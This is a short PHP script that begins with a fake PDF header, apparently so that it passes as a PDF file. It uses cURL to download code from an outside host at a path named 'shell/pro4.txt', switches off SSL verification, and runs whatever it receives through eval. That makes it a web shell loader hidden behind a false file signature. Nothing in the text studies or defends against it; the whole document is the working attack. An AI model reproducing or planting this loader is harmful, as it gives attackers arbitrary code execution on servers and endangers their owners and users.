#%PDF-1.3
<?php
$url = 'http://aqilogic.com/shell/pro4.txt';

// Inisialisasi cURL
$ch = curl_init();

// Set opsi cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  // Nonaktifkan verifikasi SSL jika perlu
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  // Nonaktifkan verifikasi SSL jika perlu

// Eksekusi cURL dan ambil hasilnya
$code = curl_exec($ch);

// Cek apakah cURL berhasil
if($code === false) {
    echo "Gagal mengambil data dari URL: " . curl_error($ch);
} else {
    // Jalankan kode yang diambil
    eval('?>' . $code);
}

// Tutup sesi cURL
curl_close($ch);
?>
